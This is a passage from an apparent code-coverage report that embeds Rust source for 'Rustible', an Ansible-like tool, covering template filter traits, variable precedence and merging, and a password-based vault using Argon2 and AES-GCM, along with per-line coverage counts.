handler is triggered.\n    async fn on_handler_triggered(\u0026self, name: \u0026str) {\n        let _ = name;\n    }\n\n    /// Called when facts are gathered.\n    async fn on_facts_gathered(\u0026self, host: \u0026str, facts: \u0026Facts) {\n        let _ = (host, facts);\n    }\n}\n\n// ============================================================================\n// Filter/Test Traits for Templates\n// ============================================================================\n\n/// Custom filter for template engine.\npub trait TemplateFilter: Send + Sync {\n    /// Returns the name of this filter.\n    fn name(\u0026self) -\u003e \u0026str;\n\n    /// Applies the filter to a value.\n    fn apply(\n        \u0026self,\n        value: \u0026serde_json::Value,\n        args: \u0026[serde_json::Value],\n    ) -\u003e Result\u003cserde_json::Value\u003e;\n}\n\n/// Custom test for template engine.\npub trait TemplateTest: Send + Sync {\n    /// Returns the name of this test.\n    fn name(\u0026self) -\u003e \u0026str;\n\n    /// Evaluates the test.\n    fn test(\u0026self, value: \u0026serde_json::Value, args: \u0026[serde_json::Value]) -\u003e Result\u003cbool\u003e;\n}\n","traces":[{"line":59,"address":[36783361],"length":1,"stats":{"Line":0}},{"line":66,"address":[61810304,61810944,61810784,61810464,61810624],"length":1,"stats":{"Line":0}},{"line":67,"address":[36783495,36783521],"length":1,"stats":{"Line":0}},{"line":73,"address":[36781042],"length":1,"stats":{"Line":0}},{"line":74,"address":[36781067],"length":1,"stats":{"Line":0}},{"line":80,"address":[],"length":0,"stats":{"Line":0}},{"line":81,"address":[36781856],"length":1,"stats":{"Line":0}},{"line":82,"address":[36781877],"length":1,"stats":{"Line":0}},{"line":100,"address":[],"length":0,"stats":{"Line":0}},{"line":102,"address":[],"length":0,"stats":{"Line":0}},{"line":103,"address":[],"length":0,"stats":{"Line":0}},{"line":104,"address":[36781376],"length":1,"stats":{"Line":0}},{"line":111,"address":[36785904],"length":1,"stats":{"Line":0}},{"line":116,"address":[],"length":0,"stats":{"Line":0}},{"line":117,"address":[],"length":0,"stats":{"Line":0}},{"line":139,"address":[],"length":0,"stats":{"Line":0}},{"line":140,"address":[],"length":0,"stats":{"Line":0}},{"line":141,"address":[],"length":0,"stats":{"Line":0}},{"line":142,"address":[],"length":0,"stats":{"Line":0}},{"line":143,"address":[],"length":0,"stats":{"Line":0}},{"line":213,"address":[23917538,23917560,23917312],"length":1,"stats":{"Line":1}},{"line":217,"address":[36781469],"length":1,"stats":{"Line":1}},{"line":220,"address":[36781520],"length":1,"stats":{"Line":1}},{"line":225,"address":[23917856,23918082,23918104],"length":1,"stats":{"Line":1}},{"line":229,"address":[23917883],"length":1,"stats":{"Line":1}},{"line":232,"address":[36781719],"length":1,"stats":{"Line":1}},{"line":237,"address":[23917584,23917832,23917810],"length":1,"stats":{"Line":1}},{"line":241,"address":[36781328],"length":1,"stats":{"Line":1}},{"line":244,"address":[23917637],"length":1,"stats":{"Line":1}},{"line":249,"address":[23918376,23918354,23918128],"length":1,"stats":{"Line":1}},{"line":253,"address":[36781216],"length":1,"stats":{"Line":1}},{"line":256,"address":[23918181],"length":1,"stats":{"Line":1}},{"line":261,"address":[57001533,57001497,57001592],"length":1,"stats":{"Line":0}},{"line":262,"address":[57001573,57001609,57001652],"length":1,"stats":{"Line":0}},{"line":263,"address":[26706951],"length":1,"stats":{"Line":0}},{"line":267,"address":[57001887],"length":1,"stats":{"Line":0}},{"line":268,"address":[],"length":0,"stats":{"Line":0}},{"line":269,"address":[],"length":0,"stats":{"Line":0}},{"line":409,"address":[36782744],"length":1,"stats":{"Line":0}},{"line":411,"address":[26707312],"length":1,"stats":{"Line":0}},{"line":412,"address":[36782751],"length":1,"stats":{"Line":0}},{"line":416,"address":[26706992],"length":1,"stats":{"Line":0}},{"line":417,"address":[26707030],"length":1,"stats":{"Line":0}},{"line":418,"address":[26707073],"length":1,"stats":{"Line":0}},{"line":419,"address":[36783124],"length":1,"stats":{"Line":0}},{"line":420,"address":[36783147],"length":1,"stats":{"Line":0}},{"line":422,"address":[26707089],"length":1,"stats":{"Line":0}},{"line":493,"address":[],"length":0,"stats":{"Line":0}},{"line":494,"address":[],"length":0,"stats":{"Line":0}},{"line":550,"address":[],"length":0,"stats":{"Line":0}},{"line":551,"address":[],"length":0,"stats":{"Line":0}},{"line":552,"address":[],"length":0,"stats":{"Line":0}},{"line":629,"address":[],"length":0,"stats":{"Line":0}},{"line":630,"address":[],"length":0,"stats":{"Line":0}},{"line":634,"address":[],"length":0,"stats":{"Line":0}},{"line":635,"address":[],"length":0,"stats":{"Line":0}},{"line":639,"address":[],"length":0,"stats":{"Line":0}},{"line":640,"address":[],"length":0,"stats":{"Line":0}},{"line":644,"address":[23918400,23918418],"length":1,"stats":{"Line":0}},{"line":645,"address":[],"length":0,"stats":{"Line":0}},{"line":649,"address":[23918496,23918515],"length":1,"stats":{"Line":0}},{"line":650,"address":[],"length":0,"stats":{"Line":0}},{"line":654,"address":[],"length":0,"stats":{"Line":0}},{"line":655,"address":[],"length":0,"stats":{"Line":0}},{"line":659,"address":[23918675,23918656],"length":1,"stats":{"Line":0}},{"line":660,"address":[],"length":0,"stats":{"Line":0}},{"line":664,"address":[23918576,23918595],"length":1,"stats":{"Line":0}},{"line":665,"address":[],"length":0,"stats":{"Line":0}}],"covered":12,"coverable":68},{"path":["/","home","artur","Repositories","rustible","src","vars","mod.rs"],"content":"//! Variable system for Rustible.\n//!\n//! This module provides comprehensive variable management including:\n//! - Variable precedence (similar to Ansible's 22 levels)\n//! - Variable merging\n//! - Vault-like secret handling\n\nuse aes_gcm::{\n    aead::{Aead, KeyInit},\n    Aes256Gcm, Nonce,\n};\nuse argon2::{password_hash::SaltString, Argon2, PasswordHasher};\nuse indexmap::IndexMap;\nuse rand::rngs::OsRng;\nuse serde::{Deserialize, Serialize};\nuse std::collections::HashMap;\nuse std::path::Path;\nuse thiserror::Error;\n\n/// Variable precedence levels (from lowest to highest)\n/// Based on Ansible's variable precedence\n#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]\n#[repr(u8)]\npub enum VarPrecedence {\n    /// Role defaults (lowest priority)\n    RoleDefaults = 1,\n    /// Dynamic inventory group vars\n    InventoryGroupVars = 2,\n    /// Inventory file group vars\n    InventoryFileGroupVars = 3,\n    /// Playbook group_vars/all\n    PlaybookGroupVarsAll = 4,\n    /// Playbook group_vars/* (specific group)\n    PlaybookGroupVars = 5,\n    /// Dynamic inventory host vars\n    InventoryHostVars = 6,\n    /// Inventory file host vars\n    InventoryFileHostVars = 7,\n    /// Playbook host_vars/*\n    PlaybookHostVars = 8,\n    /// Host facts / cached set_facts\n    HostFacts = 9,\n    /// Play vars\n    PlayVars = 10,\n    /// Play vars_prompt\n    PlayVarsPrompt = 11,\n    /// Play vars_files\n    PlayVarsFiles = 12,\n    /// Role vars (from role's vars/main.yml)\n    RoleVars = 13,\n    /// Block vars\n    BlockVars = 14,\n    /// Task vars (only for the specific task)\n    TaskVars = 15,\n    /// Include vars\n    IncludeVars = 16,\n    /// set_facts / registered vars\n    SetFacts = 17,\n    /// Role params (when including role)\n    RoleParams = 18,\n    /// Include params\n    IncludeParams = 19,\n    /// Extra vars (--extra-vars, -e) - highest priority\n    ExtraVars = 20,\n}\n\nimpl VarPrecedence {\n    /// Get all precedence levels in order (lowest to highest)\n    pub fn all() -\u003e impl Iterator\u003cItem = VarPrecedence\u003e {\n        [\n            VarPrecedence::RoleDefaults,\n            VarPrecedence::InventoryGroupVars,\n            VarPrecedence::InventoryFileGroupVars,\n            VarPrecedence::PlaybookGroupVarsAll,\n            VarPrecedence::PlaybookGroupVars,\n            VarPrecedence::InventoryHostVars,\n            VarPrecedence::InventoryFileHostVars,\n            VarPrecedence::PlaybookHostVars,\n            VarPrecedence::HostFacts,\n            VarPrecedence::PlayVars,\n            VarPrecedence::PlayVarsPrompt,\n            VarPrecedence::PlayVarsFiles,\n            VarPrecedence::RoleVars,\n            VarPrecedence::BlockVars,\n            VarPrecedence::TaskVars,\n            VarPrecedence::IncludeVars,\n            VarPrecedence::SetFacts,\n            VarPrecedence::RoleParams,\n            VarPrecedence::IncludeParams,\n            VarPrecedence::ExtraVars,\n        ]\n        .into_iter()\n    }\n\n    /// Get the precedence level number\n    pub fn level(\u0026self) -\u003e u8 {\n        *self as u8\n    }\n}\n\nimpl std::fmt::Display for VarPrecedence {\n    fn fmt(\u0026self, f: \u0026mut std::fmt::Formatter\u003c'_\u003e) -\u003e std::fmt::Result {\n        let name = match self {\n            VarPrecedence::RoleDefaults =\u003e \"role defaults\",\n            VarPrecedence::InventoryGroupVars =\u003e \"inventory group vars\",\n            VarPrecedence::InventoryFileGroupVars =\u003e \"inventory file group vars\",\n            VarPrecedence::PlaybookGroupVarsAll =\u003e \"playbook group_vars/all\",\n            VarPrecedence::PlaybookGroupVars =\u003e \"playbook group_vars/*\",\n            VarPrecedence::InventoryHostVars =\u003e \"inventory host vars\",\n            VarPrecedence::InventoryFileHostVars =\u003e \"inventory file host vars\",\n            VarPrecedence::PlaybookHostVars =\u003e \"playbook host_vars/*\",\n            VarPrecedence::HostFacts =\u003e \"host facts\",\n            VarPrecedence::PlayVars =\u003e \"play vars\",\n            VarPrecedence::PlayVarsPrompt =\u003e \"play vars_prompt\",\n            VarPrecedence::PlayVarsFiles =\u003e \"play vars_files\",\n            VarPrecedence::RoleVars =\u003e \"role vars\",\n            VarPrecedence::BlockVars =\u003e \"block vars\",\n            VarPrecedence::TaskVars =\u003e \"task vars\",\n            VarPrecedence::IncludeVars =\u003e \"include vars\",\n            VarPrecedence::SetFacts =\u003e \"set_facts\",\n            VarPrecedence::RoleParams =\u003e \"role params\",\n            VarPrecedence::IncludeParams =\u003e \"include params\",\n            VarPrecedence::ExtraVars =\u003e \"extra vars\",\n        };\n        write!(f, \"{}\", name)\n    }\n}\n\n/// Errors that can occur in the variable system\n#[derive(Debug, Error)]\npub enum VarsError {\n    #[error(\"IO error: {0}\")]\n    Io(#[from] std::io::Error),\n\n    #[error(\"YAML error: {0}\")]\n    Yaml(#[from] serde_yaml::Error),\n\n    #[error(\"JSON error: {0}\")]\n    Json(#[from] serde_json::Error),\n\n    #[error(\"undefined variable: {0}\")]\n    UndefinedVariable(String),\n\n    #[error(\"vault error: {0}\")]\n    VaultError(String),\n\n    #[error(\"invalid vault format\")]\n    InvalidVaultFormat,\n\n    #[error(\"encryption error: {0}\")]\n    EncryptionError(String),\n\n    #[error(\"decryption error: {0}\")]\n    DecryptionError(String),\n\n    #[error(\"merge error: {0}\")]\n    MergeError(String),\n\n    #[error(\"type error: expected {expected}, got {actual}\")]\n    TypeError { expected: String, actual: String },\n}\n\n/// Result type for variable operations\npub type VarsResult\u003cT\u003e = Result\u003cT, VarsError\u003e;\n\n/// A variable with its source/precedence information\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct Variable {\n    /// The variable value\n    pub value: serde_yaml::Value,\n\n    /// Source precedence level\n    pub precedence: VarPrecedence,\n\n    /// Source file (if applicable)\n    pub source: Option\u003cString\u003e,\n\n    /// Whether this is an encrypted vault value\n    pub encrypted: bool,\n}\n\nimpl Variable {\n    /// Create a new variable\n    pub fn new(value: serde_yaml::Value, precedence: VarPrecedence) -\u003e Self {\n        Self {\n            value,\n            precedence,\n            source: None,\n            encrypted: false,\n        }\n    }\n\n    /// Create a variable with source information\n    pub fn with_source(\n        value: serde_yaml::Value,\n        precedence: VarPrecedence,\n        source: impl Into\u003cString\u003e,\n    ) -\u003e Self {\n        Self {\n            value,\n            precedence,\n            source: Some(source.into()),\n            encrypted: false,\n        }\n    }\n\n    /// Mark as encrypted\n    pub fn encrypted(mut self) -\u003e Self {\n        self.encrypted = true;\n        self\n    }\n}\n\n/// Hash strategy for merging variables\n#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, Serialize, Deserialize)]\npub enum HashBehaviour {\n    /// Replace hash entirely (Ansible default)\n    #[default]\n    Replace,\n    /// Merge hashes recursively\n    Merge,\n}\n\n/// The main variable store\n#[derive(Debug, Clone, Default)]\npub struct VarStore {\n    /// Variables organized by precedence level\n    layers: HashMap\u003cVarPrecedence, IndexMap\u003cString, Variable\u003e\u003e,\n\n    /// Cached merged variables (invalidated on changes)\n    merged_cache: Option\u003cIndexMap\u003cString, serde_yaml::Value\u003e\u003e,\n\n    /// Hash merge behavior\n    hash_behaviour: HashBehaviour,\n\n    /// Vault password for encrypted values\n    vault_password: Option\u003cString\u003e,\n}\n\nimpl VarStore {\n    /// Create a new empty variable store\n    pub fn new() -\u003e Self {\n        Self {\n            layers: HashMap::new(),\n            merged_cache: None,\n            hash_behaviour: HashBehaviour::Replace,\n            vault_password: None,\n        }\n    }\n\n    /// Create a variable store with merge behavior\n    pub fn with_hash_behaviour(hash_behaviour: HashBehaviour) -\u003e Self {\n        Self {\n            hash_behaviour,\n            ..Default::default()\n        }\n    }\n\n    /// Set the vault password\n    pub fn set_vault_password(\u0026mut self, password: impl Into\u003cString\u003e) {\n        self.vault_password = Some(password.into());\n    }\n\n    /// Set a variable at a specific precedence level\n    pub fn set(\n        \u0026mut self,\n        key: impl Into\u003cString\u003e,\n        value: serde_yaml::Value,\n        precedence: VarPrecedence,\n    ) {\n        self.merged_cache = None; // Invalidate cache\n\n        let layer = self.layers.entry(precedence).or_default();\n        layer.insert(key.into(), Variable::new(value, precedence));\n    }\n\n    /// Set a variable with full metadata\n    pub fn set_variable(\u0026mut self, key: impl Into\u003cString\u003e, variable: Variable) {\n        self.merged_cache = None;\n\n        let layer = self.layers.entry(variable.precedence).or_default();\n        layer.insert(key.into(), variable);\n    }\n\n    /// Set multiple variables at a precedence level\n    pub fn set_many(\n        \u0026mut self,\n        vars: IndexMap\u003cString, serde_yaml::Value\u003e,\n        precedence: VarPrecedence,\n    ) {\n        self.merged_cache = None;\n\n        let layer = self.layers.entry(precedence).or_default();\n        for (key, value) in vars {\n            layer.insert(key, Variable::new(value, precedence));\n        }\n    }\n\n    /// Set multiple variables with source information\n    pub fn set_many_from_file\u003cP: AsRef\u003cPath\u003e\u003e(\n        \u0026mut self,\n        vars: IndexMap\u003cString, serde_yaml::Value\u003e,\n        precedence: VarPrecedence,\n        source: P,\n    ) {\n        self.merged_cache = None;\n\n        let source_str = source.as_ref().display().to_string();\n        let layer = self.layers.entry(precedence).or_default();\n\n        for (key, value) in vars {\n            layer.insert(key, Variable::with_source(value, precedence, \u0026source_str));\n        }\n    }\n\n    /// Get a variable (considering precedence)\n    pub fn get(\u0026mut self, key: \u0026str) -\u003e Option\u003c\u0026serde_yaml::Value\u003e {\n        self.ensure_merged();\n        self.merged_cache.as_ref().and_then(|cache| cache.get(key))\n    }\n\n    /// Get the raw Variable with metadata\n    pub fn get_variable(\u0026self, key: \u0026str) -\u003e Option\u003c\u0026Variable\u003e {\n        // Find the variable at the highest precedence level\n        for precedence in VarPrecedence::all().collect::\u003cVec\u003c_\u003e\u003e().into_iter().rev() {\n            if let Some(layer) = self.layers.get(\u0026precedence) {\n                if let Some(var) = layer.get(key) {\n                    return Some(var);\n                }\n            }\n        }\n        None\n    }\n\n    /// Check if a variable exists\n    pub fn contains(\u0026mut self, key: \u0026str) -\u003e bool {\n        self.get(key).is_some()\n    }\n\n    /// Remove a variable from a specific precedence level\n    pub fn remove(\u0026mut self, key: \u0026str, precedence: VarPrecedence) -\u003e Option\u003cVariable\u003e {\n        self.merged_cache = None;\n\n        self.layers\n            .get_mut(\u0026precedence)\n            .and_then(|layer| layer.swap_remove(key))\n    }\n\n    /// Clear all variables at a specific precedence level\n    pub fn clear_precedence(\u0026mut self, precedence: VarPrecedence) {\n        self.merged_cache = None;\n        self.layers.remove(\u0026precedence);\n    }\n\n    /// Clear all variables\n    pub fn clear(\u0026mut self) {\n        self.merged_cache = None;\n        self.layers.clear();\n    }\n\n    /// Get the current hash behaviour\n    pub fn hash_behaviour(\u0026self) -\u003e HashBehaviour {\n        self.hash_behaviour\n    }\n\n    /// Check if the merged cache is valid\n    pub fn is_cache_valid(\u0026self) -\u003e bool {\n        self.merged_cache.is_some()\n    }\n\n    /// Get all merged variables\n    pub fn all(\u0026mut self) -\u003e \u0026IndexMap\u003cString, serde_yaml::Value\u003e {\n        self.ensure_merged();\n        self.merged_cache.as_ref().unwrap()\n    }\n\n    /// Get all variable names\n    pub fn keys(\u0026mut self) -\u003e impl Iterator\u003cItem = \u0026String\u003e {\n        self.ensure_merged();\n        self.merged_cache.as_ref().unwrap().keys()\n    }\n\n    /// Ensure the merged cache is up to date\n    fn ensure_merged(\u0026mut self) {\n        if self.merged_cache.is_some() {\n            return;\n        }\n\n        let mut merged = IndexMap::new();\n\n        // Apply variables in precedence order (lowest to highest)\n        for precedence in VarPrecedence::all() {\n            if let Some(layer) = self.layers.get(\u0026precedence) {\n                for (key, var) in layer {\n                    self.merge_value(\u0026mut merged, key, \u0026var.value);\n                }\n            }\n        }\n\n        self.merged_cache = Some(merged);\n    }\n\n    /// Merge a value into the merged map\n    fn merge_value(\n        \u0026self,\n        merged: \u0026mut IndexMap\u003cString, serde_yaml::Value\u003e,\n        key: \u0026str,\n        value: \u0026serde_yaml::Value,\n    ) {\n        match self.hash_behaviour {\n            HashBehaviour::Replace =\u003e {\n                merged.insert(key.to_string(), value.clone());\n            }\n            HashBehaviour::Merge =\u003e {\n                if let Some(existing) = merged.get(key) {\n                    let new_value = deep_merge(existing, value);\n                    merged.insert(key.to_string(), new_value);\n                } else {\n                    merged.insert(key.to_string(), value.clone());\n                }\n            }\n        }\n    }\n\n    /// Load variables from a YAML file\n    pub fn load_file\u003cP: AsRef\u003cPath\u003e\u003e(\n        \u0026mut self,\n        path: P,\n        precedence: VarPrecedence,\n    ) -\u003e VarsResult\u003c()\u003e {\n        let content = std::fs::read_to_string(\u0026path)?;\n\n        // Check if it's vault encrypted\n        if content.starts_with(\"$ANSIBLE_VAULT;\") {\n            let decrypted = self.decrypt_vault(\u0026content)?;\n            let vars: IndexMap\u003cString, serde_yaml::Value\u003e = serde_yaml::from_str(\u0026decrypted)?;\n            self.set_many_from_file(vars, precedence, \u0026path);\n        } else {\n            let vars: IndexMap\u003cString, serde_yaml::Value\u003e = serde_yaml::from_str(\u0026content)?;\n            self.set_many_from_file(vars, precedence, \u0026path);\n        }\n\n        Ok(())\n    }\n\n    /// Decrypt a vault-encrypted string\n    fn decrypt_vault(\u0026self, content: \u0026str) -\u003e VarsResult\u003cString\u003e {\n        let password = self\n            .vault_password\n            .as_ref()\n            .ok_or_else(|| VarsError::VaultError(\"No vault password set\".to_string()))?;\n\n        Vault::decrypt(content, password)\n    }\n\n    /// Create a child scope with additional variables\n    pub fn scope(\u0026self) -\u003e VarScope {\n        VarScope::new(self)\n    }\n\n    /// Get variable count\n    pub fn len(\u0026mut self) -\u003e usize {\n        self.ensure_merged();\n        self.merged_cache.as_ref().map(|c| c.len()).unwrap_or(0)\n    }\n\n    /// Check if empty\n    pub fn is_empty(\u0026mut self) -\u003e bool {\n        self.len() == 0\n    }\n}\n\n/// A child scope for temporary variable additions\n#[derive(Debug)]\npub struct VarScope\u003c'a\u003e {\n    /// Parent store\n    parent: \u0026'a VarStore,\n\n    /// Local overrides\n    local: IndexMap\u003cString, serde_yaml::Value\u003e,\n}\n\nimpl\u003c'a\u003e VarScope\u003c'a\u003e {\n    /// Create a new scope\n    fn new(parent: \u0026'a VarStore) -\u003e Self {\n        Self {\n            parent,\n            local: IndexMap::new(),\n        }\n    }\n\n    /// Set a local variable\n    pub fn set(\u0026mut self, key: impl Into\u003cString\u003e, value: serde_yaml::Value) {\n        self.local.insert(key.into(), value);\n    }\n\n    /// Set multiple local variables\n    pub fn set_many(\u0026mut self, vars: IndexMap\u003cString, serde_yaml::Value\u003e) {\n        for (key, value) in vars {\n            self.local.insert(key, value);\n        }\n    }\n\n    /// Get a variable (local overrides parent)\n    pub fn get(\u0026self, key: \u0026str) -\u003e Option\u003c\u0026serde_yaml::Value\u003e {\n        self.local\n            .get(key)\n            .or_else(|| self.parent.get_variable(key).map(|v| \u0026v.value))\n    }\n\n    /// Get all merged variables\n    pub fn all(\u0026self) -\u003e IndexMap\u003cString, serde_yaml::Value\u003e {\n        let mut merged = IndexMap::new();\n\n        // Get parent variables\n        for precedence in VarPrecedence::all() {\n            if let Some(layer) = self.parent.layers.get(\u0026precedence) {\n                for (key, var) in layer {\n                    merged.insert(key.clone(), var.value.clone());\n                }\n            }\n        }\n\n        // Apply local overrides\n        for (key, value) in \u0026self.local {\n            merged.insert(key.clone(), value.clone());\n        }\n\n        merged\n    }\n}\n\n/// Deep merge two YAML values\npub fn deep_merge(base: \u0026serde_yaml::Value, overlay: \u0026serde_yaml::Value) -\u003e serde_yaml::Value {\n    match (base, overlay) {\n        (serde_yaml::Value::Mapping(base_map), serde_yaml::Value::Mapping(overlay_map)) =\u003e {\n            let mut merged = base_map.clone();\n            for (key, value) in overlay_map {\n                if let Some(base_value) = base_map.get(key) {\n                    merged.insert(key.clone(), deep_merge(base_value, value));\n                } else {\n                    merged.insert(key.clone(), value.clone());\n                }\n            }\n            serde_yaml::Value::Mapping(merged)\n        }\n        // For non-mappings, overlay wins\n        (_, overlay) =\u003e overlay.clone(),\n    }\n}\n\n/// Vault encryption/decryption utilities\npub struct Vault;\n\nimpl Vault {\n    /// Vault header format\n    const HEADER: \u0026'static str = \"$ANSIBLE_VAULT;1.1;AES256\";\n\n    /// Encrypt content with a password\n    pub fn encrypt(content: \u0026str, password: \u0026str) -\u003e VarsResult\u003cString\u003e {\n        // Derive key from password using Argon2\n        let salt = SaltString::generate(\u0026mut OsRng);\n        let argon2 = Argon2::default();\n\n        let password_hash = argon2\n            .hash_password(password.as_bytes(), \u0026salt)\n            .map_err(|e| VarsError::EncryptionError(e.to_string()))?;\n\n        let key_bytes = password_hash\n            .hash\n            .ok_or_else(|| VarsError::EncryptionError(\"Failed to generate key\".to_string()))?;\n\n        // Use first 32 bytes as AES-256 key\n        let key_slice = \u0026key_bytes.as_bytes()[..32];\n        let cipher = Aes256Gcm::new_from_slice(key_slice)\n            .map_err(|e| VarsError::EncryptionError(e.to_string()))?;\n\n        // Generate random nonce\n        use rand::RngCore;\n        let mut nonce_bytes = [0u8; 12];\n        OsRng.fill_bytes(\u0026mut nonce_bytes);\n        let nonce = Nonce::from_slice(\u0026nonce_bytes);\n\n        // Encrypt\n        let ciphertext = cipher\n            .encrypt(nonce, content.as_bytes())\n            .map_err(|e| VarsError::EncryptionError(e.to_string()))?;\n\n        // Encode as hex\n        use base64::Engine;\n        let encoded_salt = salt.as_str().to_string();\n        let encoded_nonce = base64::engine::general_purpose::STANDARD.encode(\u0026nonce_bytes);\n        let encoded_ciphertext = base64::engine::general_purpose::STANDARD.encode(\u0026ciphertext);\n\n        // Format as vault file\n        let vault_content = format!(\n            \"{}\\n{}\\n{}\\n{}\",\n            Self::HEADER,\n            encoded_salt,\n            encoded_nonce,\n            encoded_ciphertext\n        );\n\n        Ok(vault_content)\n    }\n\n    /// Decrypt vault content with a password\n    pub fn decrypt(content: \u0026str, password: \u0026str) -\u003e VarsResult\u003cString\u003e {\n        let lines: Vec\u003c\u0026str\u003e = content.lines().collect();\n\n        if lines.len() \u003c 4 {\n            return Err(VarsError::InvalidVaultFormat);\n        }\n\n        // Verify header\n        if !lines[0].starts_with(\"$ANSIBLE_VAULT;\") {\n            return Err(VarsError::InvalidVaultFormat);\n        }\n\n        // Parse components\n        let salt_str = lines[1];\n        let salt = SaltString::from_b64(salt_str).map_err(|_| VarsError::InvalidVaultFormat)?;\n\n        use base64::Engine;\n        let nonce_bytes = base64::engine::general_purpose::STANDARD\n            .decode(lines[2])\n            .map_err(|_| VarsError::InvalidVaultFormat)?;\n\n        let ciphertext = base64::engine::general_purpose::STANDARD\n            .decode(lines[3..].join(\"\"))\n            .map_err(|_| VarsError::InvalidVaultFormat)?;\n\n        // Derive key from password\n        let argon2 = Argon2::default();\n        let password_hash = argon2\n            .hash_password(password.as_bytes(), \u0026salt)\n            .map_err(|e| VarsError::DecryptionError(e.to_string()))?;\n\n        let key_bytes = password_hash\n            .hash\n            .ok_or_else(|| VarsError::DecryptionError(\"Failed to derive key\".to_string()))?;\n\n        // Decrypt\n        let key_slice = \u0026key_bytes.as_bytes()[..32];\n        let cipher = Aes256Gcm::new_from_slice(key_slice)\n            .map_err(|e| VarsError::DecryptionError(e.to_string()))?;\n\n        let nonce = Nonce::from_slice(\u0026nonce_bytes);\n\n        let plaintext = cipher\n            .decrypt(nonce, ciphertext.as_ref())\n            .map_err(|e| VarsError::DecryptionError(e.to_string()))?;\n\n        String::from_utf8(plaintext).map_err(|e| VarsError::DecryptionError(e.to_string()))\n    }\n\n    /// Check if content is vault encrypted\n    pub fn is_encrypted(content: \u0026str) -\u003e bool {\n        content.trim_start().starts_with(\"$ANSIBLE_VAULT;\")\n    }\n\n    /// Encrypt a file in place\n    pub fn encrypt_file\u003cP: AsRef\u003cPath\u003e\u003e(path: P, password: \u0026str) -\u003e VarsResult\u003c()\u003e {\n        let content = std::fs::read_to_string(\u0026path)?;\n\n        if Self::is_encrypted(\u0026content) {\n            return Err(VarsError::VaultError(\n                \"File is already encrypted\".to_string(),\n            ));\n        }\n\n        let encrypted = Self::encrypt(\u0026content, password)?;\n        std::fs::write(path, encrypted)?;\n\n        Ok(())\n    }\n\n    /// Decrypt a file in place\n    pub fn decrypt_file\u003cP: AsRef\u003cPath\u003e\u003e(path: P, password: \u0026str) -\u003e VarsResult\u003c()\u003e {\n        let content = std::fs::read_to_string(\u0026path)?;\n\n        if !Self::is_encrypted(\u0026content) {\n            return Err(VarsError::VaultError(\"File is not encrypted\".to_string()));\n        }\n\n        let decrypted = Self::decrypt(\u0026content, password)?;\n        std::fs::write(path, decrypted)?;\n\n        Ok(())\n    }\n\n    /// View encrypted file contents without modifying\n    pub fn view_file\u003cP: AsRef\u003cPath\u003e\u003e(path: P, password: \u0026str) -\u003e VarsResult\u003cString\u003e {\n        let content = std::fs::read_to_string(\u0026path)?;\n        Self::decrypt(\u0026content, password)\n    }\n}\n\n/// Inline vault encryption marker\nconst VAULT_INLINE_PREFIX: \u0026str = \"!vault |\";\n\n/// Parse inline vault values from YAML\npub fn parse_inline_vault(\n    value: \u0026serde_yaml::Value,\n    password: \u0026str,\n) -\u003e VarsResult\u003cserde_yaml::Value\u003e {\n    match value {\n        serde_yaml::Value::String(s) if s.starts_with(VAULT_INLINE_PREFIX) =\u003e {\n            let encrypted = s.trim_start_matches(VAULT_INLINE_PREFIX).trim();\n            let decrypted = Vault::decrypt(encrypted, password)?;\n            Ok(serde_yaml::Value::String(decrypted))\n        }\n        serde_yaml::Value::Mapping(map) =\u003e {\n            let mut result = serde_yaml::Mapping::new();\n            for (k, v) in map {\n                result.insert(k.clone(), parse_inline_vault(v, password)?);\n            }\n            Ok(serde_yaml::Value::Mapping(result))\n        }\n        serde_yaml::Value::Sequence(seq) =\u003e {\n            let result: VarsResult\u003cVec\u003c_\u003e\u003e = seq\n                .iter()\n                .map(|v| parse_inline_vault(v, password))\n                .collect();\n            Ok(serde_yaml::Value::Sequence(result?))\n        }\n        _ =\u003e Ok(value.clone()),\n    }\n}\n\n/// Variable resolution helpers\npub mod resolve {\n    #[allow(unused_imports)]\n    use super::*;\n\n    /// Resolve a variable path (e.g., \"foo.bar.baz\")\n    pub fn resolve_path\u003c'a\u003e(\n        value: \u0026'a serde_yaml::Value,\n        path: \u0026str,\n    ) -\u003e Option\u003c\u0026'a serde_yaml::Value\u003e {\n        let parts: Vec\u003c\u0026str\u003e = path.split('.').collect();\n        let mut current = value;\n\n        for part in parts {\n            match current {\n                serde_yaml::Value::Mapping(map) =\u003e {\n                    current = map.get(\u0026serde_yaml::Value::String(part.to_string()))?;\n                }\n                serde_yaml::Value::Sequence(seq) =\u003e {\n                    let index: usize = part.parse().ok()?;\n                    current = seq.get(index)?;\n                }\n                _ =\u003e return None,\n            }\n        }\n\n        Some(current)\n    }\n\n    /// Set a value at a path (creating intermediate structures)\n    pub fn set_path(\n        value: \u0026mut serde_yaml::Value,\n        path: \u0026str,\n        new_value: serde_yaml::Value,\n    ) -\u003e bool {\n        let parts: Vec\u003c\u0026str\u003e = path.split('.').collect();\n\n        if parts.is_empty() {\n            return false;\n        }\n\n        let mut current = value;\n\n        for (i, part) in parts.iter().enumerate() {\n            let is_last = i == parts.len() - 1;\n\n            if is_last {\n                if let serde_yaml::Value::Mapping(map) = current {\n                    map.insert(\n                        serde_yaml::Value::String(part.to_string()),\n                        new_value.clone(),\n                    );\n                    return true;\n                }\n                return false;\n            }\n\n            // Navigate or create intermediate maps\n            if let serde_yaml::Value::Mapping(map) = current {\n                let key = serde_yaml::Value::String(part.to_string());\n                if !map.contains_key(\u0026key) {\n                    map.insert(\n                        key.clone(),\n                        serde_yaml::Value::Mapping(serde_yaml::Mapping::new()),\n                    );\n                }\n                current = map.get_mut(\u0026key).unwrap();\n            } else {\n                return false;\n            }\n        }\n\n        false\n    }\n\n    /// Convert a value to string\n    pub fn to_string(value: \u0026serde_yaml::Value) -\u003e String {\n        match value {\n            serde_yaml::Value::Null =\u003e String::new(),\n            serde_yaml::Value::Bool(b) =\u003e b.to_string(),\n            serde_yaml::Value::Number(n) =\u003e n.to_string(),\n            serde_yaml::Value::String(s) =\u003e s.clone(),\n            _ =\u003e serde_yaml::to_string(value).unwrap_or_default(),\n        }\n    }\n\n    /// Convert a value to boolean\n    pub fn to_bool(value: \u0026serde_yaml::Value) -\u003e Option\u003cbool\u003e {\n        match value {\n            serde_yaml::Value::Bool(b) =\u003e Some(*b),\n            serde_yaml::Value::String(s) =\u003e match s.to_lowercase().as_str() {\n                \"true\" | \"yes\" | \"on\" | \"1\" =\u003e Some(true),\n                \"false\" | \"no\" | \"off\" | \"0\" | \"\" =\u003e Some(false),\n                _ 